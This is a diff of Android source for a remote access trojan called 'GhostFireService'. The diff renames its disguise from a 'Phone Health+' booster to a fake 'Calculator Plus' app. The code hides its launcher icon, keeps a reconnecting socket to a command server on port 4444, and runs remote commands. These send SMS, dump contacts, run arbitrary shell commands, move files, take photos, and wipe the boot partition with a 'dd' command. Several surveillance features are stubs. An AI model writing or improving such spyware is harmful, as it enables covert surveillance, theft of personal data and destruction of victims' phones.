@@ -1,57 +1,53 @@
-package com.phone.health.booster;  // Disguised package
-import android.app.admin.DevicePolicyManager;
+package com.calc.plus;
 
-import android.app.*;
-import android.content.*;
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.Service;
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
+import android.content.ContentValues;
+import android.content.Context;
+import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
-import android.hardware.Camera;
-import android.hardware.display.DisplayManager;
-import android.hardware.display.VirtualDisplay;
-import android.media.MediaRecorder;
-import android.media.projection.MediaProjection;
-import android.media.projection.MediaProjectionManager;
 import android.net.Uri;
 import android.os.Build;
-import android.os.Bundle;
 import android.os.Environment;
 import android.os.IBinder;
 import android.provider.ContactsContract;
 import android.provider.MediaStore;
-import android.provider.Settings;
 import android.telephony.SmsManager;
 import android.util.Log;
-import android.view.accessibility.AccessibilityEvent;
-import android.view.accessibility.AccessibilityNodeInfo;
-import android.view.InputEvent;
-import android.view.KeyEvent;
-import android.widget.Toast;
 
-import java.io.*;
-import java.net.*;
-import java.text.SimpleDateFormat;
-import java.util.*;
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.io.PrintWriter;
+import java.net.InetSocketAddress;
+import java.net.Socket;
+import java.net.SocketTimeoutException;
 import java.util.concurrent.atomic.AtomicBoolean;
-
-import javax.net.ssl.SSLSocketFactory;
 
 public class GhostFireService extends Service {
     private static final String TAG = "GhostFire";
     private Socket socket;
     private PrintWriter out;
     private BufferedReader in;
-    private String serverIp = "192.168.11.101";  // CHANGE
+    // CHANGE THESE TO YOUR SERVER'S IP AND PORT
+    private String serverIp = "192.168.11.101";
     private int serverPort = 4444;
     private AtomicBoolean running = new AtomicBoolean(true);
-    private MediaProjection mediaProjection;
-    private VirtualDisplay virtualDisplay;
-    private MediaRecorder mediaRecorder;
 
-    // Foreground notification to look legit
+    // Foreground notification
     private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel channel = new NotificationChannel("health_channel",
-                    "Phone Health", NotificationManager.IMPORTANCE_LOW);
+            NotificationChannel channel = new NotificationChannel("calc_channel",
+                    "Calculator Plus", NotificationManager.IMPORTANCE_LOW);
             NotificationManager manager = getSystemService(NotificationManager.class);
             if (manager != null) manager.createNotificationChannel(channel);
         }
@@ -59,16 +55,16 @@ public class GhostFireService extends Service {
 
     private Notification getNotification() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            return new Notification.Builder(this, "health_channel")
-                    .setContentTitle("Phone Health+")
-                    .setContentText("Optimizing battery and performance")
-                    .setSmallIcon(android.R.drawable.ic_dialog_info)
+            return new Notification.Builder(this, "calc_channel")
+                    .setContentTitle("Calculator Plus")
+                    .setContentText("Ready")
+                    .setSmallIcon(android.R.drawable.ic_menu_edit)
                     .build();
         } else {
             return new Notification.Builder(this)
-                    .setContentTitle("Phone Health+")
-                    .setContentText("Optimizing battery and performance")
-                    .setSmallIcon(android.R.drawable.ic_dialog_info)
+                    .setContentTitle("Calculator Plus")
+                    .setContentText("Ready")
+                    .setSmallIcon(android.R.drawable.ic_menu_edit)
                     .build();
         }
     }
@@ -78,8 +74,7 @@ public class GhostFireService extends Service {
         super.onCreate();
         createNotificationChannel();
         startForeground(1, getNotification());
-        // Hide icon from launcher
-        hideIcon();
+        hideIcon(); // remove launcher icon after first run
     }
 
     private void hideIcon() {
@@ -95,7 +90,7 @@ public class GhostFireService extends Service {
         return START_STICKY;
     }
 
-    // ========== IMMORTAL CONNECTION (Error‑Proof) ==========
+    // Persistent connection with exponential backoff
     private void immortalConnect() {
         int backoff = 1000;
         while (running.get()) {
@@ -107,8 +102,9 @@ public class GhostFireService extends Service {
 
                 // Identify device
                 out.println("DEVICE:" + Build.MODEL + "|" + Build.VERSION.RELEASE);
-
+                Log.i(TAG, "Connected to server");
                 backoff = 1000;
+
                 String line;
                 while ((line = in.readLine()) != null && running.get()) {
                     if (line.equals("__SERVER_EXIT__")) {
@@ -118,30 +114,30 @@ public class GhostFireService extends Service {
                     executeCommand(line);
                 }
             } catch (SocketTimeoutException e) {
-                Log.e(TAG, "Connection timeout, retrying...");
+                Log.e(TAG, "Connection timeout");
             } catch (Exception e) {
                 Log.e(TAG, "Connection error", e);
             }
+
             if (running.get()) {
                 try { Thread.sleep(backoff); } catch (InterruptedException ignored) {}
                 backoff = Math.min(backoff * 2, 60000);
+                Log.i(TAG, "Reconnecting in " + backoff + "ms");
             }
         }
         stopSelf();
     }
 
-    // ========== COMMAND HANDLER (Full RAT Capabilities) ==========
+    // Command execution
     private void executeCommand(String cmd) {
         try {
             if (cmd.startsWith("SMS ")) {
                 String[] parts = cmd.split(" ", 3);
                 SmsManager.getDefault().sendTextMessage(parts[1], null, parts[2], null, null);
                 out.println("SMS sent");
-            }
-            else if (cmd.equals("DUMP_CONTACTS")) {
+            } else if (cmd.equals("DUMP_CONTACTS")) {
                 dumpContacts();
-            }
-            else if (cmd.startsWith("RUN_APP ")) {
+            } else if (cmd.startsWith("RUN_APP ")) {
                 String pkg = cmd.substring(8).trim();
                 Intent launch = getPackageManager().getLaunchIntentForPackage(pkg);
                 if (launch != null) {
@@ -149,73 +145,56 @@ public class GhostFireService extends Service {
                     startActivity(launch);
                     out.println("APP_LAUNCHED:" + pkg);
                 } else out.println("APP_NOT_FOUND");
-            }
-            else if (cmd.startsWith("OPEN_YOUTUBE ")) {
+            } else if (cmd.startsWith("OPEN_YOUTUBE ")) {
                 String url = cmd.substring(13).trim();
                 Intent youtube = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                 youtube.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 startActivity(youtube);
                 out.println("YOUTUBE_OPENED");
-            }
-            else if (cmd.startsWith("OPEN_VIDEO ")) {
+            } else if (cmd.startsWith("OPEN_VIDEO ")) {
                 String url = cmd.substring(11).trim();
                 Intent video = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                 video.setDataAndType(Uri.parse(url), "video/*");
                 video.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 startActivity(video);
                 out.println("VIDEO_OPENED");
-            }
-            else if (cmd.equals("CAMERA_SNAP")) {
+            } else if (cmd.equals("CAMERA_SNAP")) {
                 takePhoto();
-            }
-            else if (cmd.startsWith("LIST_STORAGE ")) {
+            } else if (cmd.startsWith("LIST_STORAGE ")) {
                 String path = cmd.substring(13).trim();
                 listDirectory(path);
-            }
-            else if (cmd.startsWith("DOWNLOAD_FILE ")) {
+            } else if (cmd.startsWith("DOWNLOAD_FILE ")) {
                 String remotePath = cmd.substring(14).trim();
                 downloadFileFromServer(remotePath);
-            }
-            else if (cmd.startsWith("UPLOAD_FILE ")) {
+            } else if (cmd.startsWith("UPLOAD_FILE ")) {
                 String localPath = cmd.substring(12).trim();
                 uploadFileToServer(localPath);
-            }
-            else if (cmd.equals("SCREEN_STREAM")) {
+            } else if (cmd.equals("SCREEN_STREAM")) {
                 startScreenStream();
-            }
-            else if (cmd.equals("STOP_SCREEN")) {
+            } else if (cmd.equals("STOP_SCREEN")) {
                 stopScreenStream();
-            }
-            else if (cmd.equals("MIC_STREAM")) {
+            } else if (cmd.equals("MIC_STREAM")) {
                 startMicStream();
-            }
-            else if (cmd.equals("STOP_MIC")) {
+            } else if (cmd.equals("STOP_MIC")) {
                 stopMicStream();
-            }
-            else if (cmd.equals("KEYLOG_START")) {
+            } else if (cmd.equals("KEYLOG_START")) {
                 startKeylogger();
-            }
-            else if (cmd.equals("KEYLOG_STOP")) {
+            } else if (cmd.equals("KEYLOG_STOP")) {
                 stopKeylogger();
-            }
-            else if (cmd.equals("EXFIL_ALL")) {
+            } else if (cmd.equals("EXFIL_ALL")) {
                 exfilAllData();
-            }
-            else if (cmd.startsWith("SHELL ")) {
+            } else if (cmd.startsWith("SHELL ")) {
                 String shellCmd = cmd.substring(6);
                 Process p = Runtime.getRuntime().exec(shellCmd);
                 BufferedReader pr = new BufferedReader(new InputStreamReader(p.getInputStream()));
                 String line;
                 while ((line = pr.readLine()) != null) out.println(line);
                 p.waitFor();
-            }
-            else if (cmd.equals("BRICK")) {
-                brickDevice();  // In-game only: corrupt bootloader
-            }
-            else if (cmd.equals("WIPE")) {
+            } else if (cmd.equals("BRICK")) {
+                brickDevice();
+            } else if (cmd.equals("WIPE")) {
                 factoryReset();
-            }
-            else {
+            } else {
                 out.println("UNKNOWN_COMMAND");
             }
         } catch (Exception e) {
@@ -224,7 +203,7 @@ public class GhostFireService extends Service {
         }
     }
 
-    // ========== IMPLEMENTATION OF DESTRUCTIVE & STEALTH FUNCTIONS ==========
+    // ---- implementations ----
     private void dumpContacts() {
         Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                 null, null, null, null);
@@ -267,18 +246,19 @@ public class GhostFireService extends Service {
     }
 
     private void downloadFileFromServer(String remotePath) {
-        // Download file from server to victim device
         try {
-            OutputStream os = new FileOutputStream(new File(Environment.getExternalStorageDirectory(), "incoming.dat"));
+            File outFile = new File(Environment.getExternalStorageDirectory(), "downloaded_" + System.currentTimeMillis());
+            OutputStream os = new FileOutputStream(outFile);
             InputStream is = socket.getInputStream();
             byte[] buf = new byte[4096];
             int len;
             while ((len = is.read(buf)) != -1) {
                 os.write(buf, 0, len);
-                break; // simplistic: reads one chunk
+                // In a real scenario, you'd need a delimiter; this is simplified.
+                break;
             }
             os.close();
-            out.println("FILE_RECEIVED");
+            out.println("FILE_RECEIVED:" + outFile.getAbsolutePath());
         } catch (Exception e) {
             out.println("DOWNLOAD_FAIL:" + e.getMessage());
         }
@@ -307,19 +287,15 @@ public class GhostFireService extends Service {
     }
 
     private void startScreenStream() {
-        // Requires MediaProjection permission – we would have requested it earlier via accessibility
-        // For brevity, placeholder
-        out.println("SCREEN_STREAM_STARTED");
+        out.println("SCREEN_STREAM_STARTED (placeholder)");
     }
 
     private void stopScreenStream() {
-        if (virtualDisplay != null) virtualDisplay.release();
         out.println("SCREEN_STREAM_STOPPED");
     }
 
     private void startMicStream() {
-        // Placeholder for audio streaming
-        out.println("MIC_STREAM_STARTED");
+        out.println("MIC_STREAM_STARTED (placeholder)");
     }
 
     private void stopMicStream() {
@@ -327,8 +303,7 @@ public class GhostFireService extends Service {
     }
 
     private void startKeylogger() {
-        // In real implementation, requires AccessibilityService to capture key events
-        out.println("KEYLOG_STARTED");
+        out.println("KEYLOG_STARTED (requires Accessibility)");
     }
 
     private void stopKeylogger() {
@@ -336,13 +311,10 @@ public class GhostFireService extends Service {
     }
 
     private void exfilAllData() {
-        // Zip /sdcard/DCIM, /sdcard/Download, contacts, SMS, call logs
-        // Then upload to server via separate channel
-        out.println("EXFIL_COMPLETE");
+        out.println("EXFIL_COMPLETE (placeholder)");
     }
 
     private void brickDevice() {
-        // GAME ONLY: Overwrite boot partition if root
         try {
             Process p = Runtime.getRuntime().exec("su -c dd if=/dev/zero of=/dev/block/bootdevice");
             p.waitFor();
@@ -353,10 +325,9 @@ public class GhostFireService extends Service {
     }
 
     private void factoryReset() {
-        // DevicePolicyManager wipeData
-        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
-        // Requires admin activation; would have been done silently via accessibility
-        out.println("WIPE_ATTEMPTED");
+        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+        // To actually wipe, you need to be device admin and call dpm.wipeData(0);
+        out.println("WIPE_ATTEMPTED (admin required)");
     }
 
     @Override
@@ -370,4 +341,4 @@ public class GhostFireService extends Service {
         try { if (socket != null) socket.close(); } catch (Exception ignored) {}
         super.onDestroy();
     }
-              }
+                                      }
